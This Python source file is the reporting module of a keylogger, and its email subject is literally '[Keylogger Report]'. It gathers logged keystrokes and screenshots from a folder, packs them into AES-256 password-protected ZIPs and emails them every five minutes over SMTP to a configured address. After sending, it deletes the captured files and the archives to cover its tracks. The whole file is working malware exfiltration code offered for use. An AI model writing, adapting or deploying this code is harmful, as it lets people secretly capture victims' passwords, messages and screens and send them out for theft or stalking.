import os
import smtplib
import ssl
import time
import mimetypes
from datetime import datetime, timezone
from email.message import EmailMessage
from datetime import datetime
from pathlib import Path

# NEW: AES ZIP
import pyzipper

# ---------- CONFIG ----------
SAVE_DIR = Path(os.environ.get("SAVE_DIR", "monitor_data")).resolve()
SAVE_DIR.mkdir(parents=True, exist_ok=True)

ZIP_PASSWORD = os.environ.get("ZIP_PASSWORD")  # REQUIRED
if not ZIP_PASSWORD:
    # Fallback is allowed for testing, but you should set ZIP_PASSWORD in env
    ZIP_PASSWORD = "CHANGE-ME-TO-A-STRONG-PASSWORD"

SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT   = int(os.environ.get("SMTP_PORT", "587"))
SMTP_USER   = os.environ.get("SMTP_USER", "")
SMTP_PASS   = os.environ.get("SMTP_PASS", "")
FROM_EMAIL  = os.environ.get("FROM_EMAIL", SMTP_USER)
TO_EMAIL    = os.environ.get("TO_EMAIL", SMTP_USER)

BATCH_SIZE = int(os.environ.get("BATCH_SIZE", "8"))
SUBJECT_PREFIX = os.environ.get("SUBJECT_PREFIX", "[Keylogger Report]")
# ----------------------------


def _chunk(lst, size):
    for i in range(0, len(lst), size):
        yield lst[i:i+size]


def _collect_attachments():
    """
    Collects files from SAVE_DIR to include in the report.
    Keep your logger/screenshotter writing into SAVE_DIR.
    """
    files = []
    for p in SAVE_DIR.iterdir():
        if p.is_file() and not p.name.endswith(".zip"):
            # include everything except existing zips
            files.append(p)
    # sort by modified time so newest go first
    files.sort(key=lambda p: p.stat().st_mtime, reverse=True)
    return files


# NEW: Create AES-256 encrypted ZIP using pyzipper
def _make_encrypted_zip(batch_files, zip_path, password: str):
    with pyzipper.AESZipFile(zip_path, mode="w", compression=pyzipper.ZIP_LZMA) as zf:
        zf.setpassword(password.encode("utf-8"))
        zf.setencryption(pyzipper.WZ_AES, nbits=256)
        for f in batch_files:
            # Store only file name inside the zip
            zf.write(f, arcname=f.name)
    return zip_path


def _send_email(subject: str, body: str, file_path: Path):
    msg = EmailMessage()
    msg["From"] = FROM_EMAIL
    msg["To"] = TO_EMAIL
    msg["Subject"] = subject
    msg.set_content(body)

    # Attach the ZIP
    mime_type, _ = mimetypes.guess_type(str(file_path))
    maintype, subtype = (mime_type.split("/", 1) if mime_type else ("application", "octet-stream"))
    with open(file_path, "rb") as fp:
        msg.add_attachment(fp.read(), maintype=maintype, subtype=subtype, filename=file_path.name)

    context = ssl.create_default_context()
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls(context=context)
        if SMTP_USER:
            server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)


def send_report():
    files = _collect_attachments()
    if not files:
        return False
        
        
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

    sent_any = False

    for idx, batch in enumerate(_chunk(files, BATCH_SIZE), start=1):
        zip_name = f"report_{timestamp}_part{idx}.zip"
        zip_path = SAVE_DIR / zip_name

        _make_encrypted_zip(batch, zip_path, ZIP_PASSWORD)

        subject = f"{SUBJECT_PREFIX} {timestamp} (part {idx})"
        body = f"Encrypted report generated at {timestamp} UTC. This ZIP uses AES-256. Keep the password safe."

        _send_email(subject, body, zip_path)
        sent_any = True

        # Optional: after successful send, you can archive or delete originals
        for f in batch:
            try:
                f.unlink(missing_ok=True)
            except Exception:
                pass

        # Optional: also remove local zip
        try:
            zip_path.unlink(missing_ok=True)
        except Exception:
            pass

    return sent_any


if __name__ == "__main__":
    # Example run loop (for testing). In your real logger, you likely call send_report()
    # on a timer (e.g., every N minutes).
    while True:
        try:
            sent = send_report()
            if sent:
                print("Report sent.")
        except Exception as e:
            print("Error while sending report:", e)
        time.sleep(300)  # every 5 minutes; adjust as needed
